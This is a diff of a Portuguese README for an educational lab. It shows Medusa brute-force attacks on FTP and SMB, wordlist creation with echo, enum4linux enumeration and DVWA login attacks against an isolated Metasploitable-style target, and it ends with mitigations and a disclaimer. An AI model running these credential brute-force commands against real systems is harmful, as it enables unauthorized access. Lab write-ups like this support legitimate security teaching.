@@ -30,12 +30,12 @@ Este projeto tem como objetivo demonstrar, de forma prática, a execução de at
 * Rede Host-Only
 * Comunicação isolada
 
-### 📡 IPs
+###  IPs
 
 * Kali: 192.168.80.129
 * Alvo: 192.168.80.128
 
-```bash
+bash
 ip a
 <img width="646" height="513" alt="image" src="https://github.com/user-attachments/assets/4d14a6c7-745b-4a60-9370-2903d5a5d723" />
 
@@ -45,9 +45,7 @@ ifconfig
 
 
 
----
-
-## 🌐 Conectividade
+##  Conectividade
 
 bash
 ping -c 3 192.168.80.128
@@ -57,7 +55,6 @@ ping -c 3 192.168.80.128
 
 <img width="641" height="173" alt="image" src="https://github.com/user-attachments/assets/87e88134-7853-4585-8b25-1bf7226a98e5" />
 
----
 
 ##  Enumeração
 
@@ -76,7 +73,6 @@ Identificação dos serviços ativos para direcionar os ataques.
 
 <img width="649" height="317" alt="image" src="https://github.com/user-attachments/assets/b9fdb7d6-9a28-4607-a53b-885e5f5efcec" />
 
----
 
 ##  FTP
 
@@ -90,7 +86,7 @@ ftp 192.168.80.128
 
 bash
 medusa -h 192.168.80.128 -U users.txt -P pass.txt -M ftp -t 6
-```
+
 
 ### Interpretação:
 
@@ -105,49 +101,44 @@ Para a realização dos ataques de força bruta, foram criadas listas de usuári
 
 ###  Criando lista de usuários
 
-```bash
-nano users.txt
-```
+bash
+echo -e "user\nmsfadmin\nadmin\nroot" > users.txt 
+
 
  **O que faz:**
 Abre o editor de texto para criar um arquivo contendo possíveis nomes de usuários.
 
 Exemplo de conteúdo:
 
-```
+
 msfadmin
 admin
 user
 test
-```
 
----
 
 ###  Criando lista de senhas
 
-```bash
-nano pass.txt
-```
+bash
+echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
+
 
  **O que faz:**
 Cria um arquivo com senhas comuns utilizadas em ataques de força bruta.
 
 Exemplo de conteúdo:
 
-```
+
 123456
 password
 admin
 msfadmin
-```
 
----
 
 ###  Interpretação
 
 A utilização de wordlists permite automatizar tentativas de login, explorando o uso de credenciais fracas.
 
----
 <img width="710" height="121" alt="image" src="https://github.com/user-attachments/assets/a90e4419-dd97-401c-9e27-170111f6484a" />
 <img width="536" height="93" alt="image" src="https://github.com/user-attachments/assets/a1b7fe02-e8d7-4cce-9646-fe63d5eac52b" />
 
@@ -200,7 +191,6 @@ A primeira forma de automatizar o ataque de força bruta em formulários de logi
 
 ![DVWA](images/09-dvwa-attack.png)
 
----
 
 ##  SMB
 
@@ -226,6 +216,13 @@ enum4linux -a 192.168.80.128 | tee enum4_output.txt
 bash
 medusa -h 192.168.80.128 -U users.txt -P pass.txt -M smbnt -t 6
 
+medusa → ferramenta de ataque de força bruta
+-h 192.168.80.128 → define o endereço do alvo
+-U users.txt → arquivo com lista de usuários
+-P pass.txt → arquivo com lista de senhas
+-M smbnt → módulo utilizado para atacar o serviço SMB
+-t 6 → número de tentativas simultâneas (threads)
+
 <img width="1286" height="368" alt="image" src="https://github.com/user-attachments/assets/03c159c6-a400-480b-b668-8adb6a5ef71b" />
 
 
@@ -233,8 +230,9 @@ medusa -h 192.168.80.128 -U users.txt -P pass.txt -M smbnt -t 6
 ###  Interpretação:
 
 Ambientes corporativos com senhas fracas são altamente vulneráveis.
+Esse comando realiza um ataque de password spraying/brute force no serviço SMB, testando múltiplas combinações de usuários e senhas automaticamente.
+O uso de múltiplas threads acelera o processo, aumentando a eficiência do ataque.
 
----
 
 ##  Mitigações
 
@@ -243,7 +241,6 @@ Ambientes corporativos com senhas fracas são altamente vulneráveis.
 * Bloqueio de tentativas
 * Monitoramento de logs
 
----
 
 ##  Conclusão
 
@@ -251,10 +248,9 @@ Os testes demonstraram que falhas simples de autenticação podem comprometer to
 
 A combinação de senhas fracas e ausência de mecanismos de proteção facilita ataques automatizados.
 
----
 
 ##  Aviso
 
 Projeto realizado apenas para fins educacionais.
 
----
+
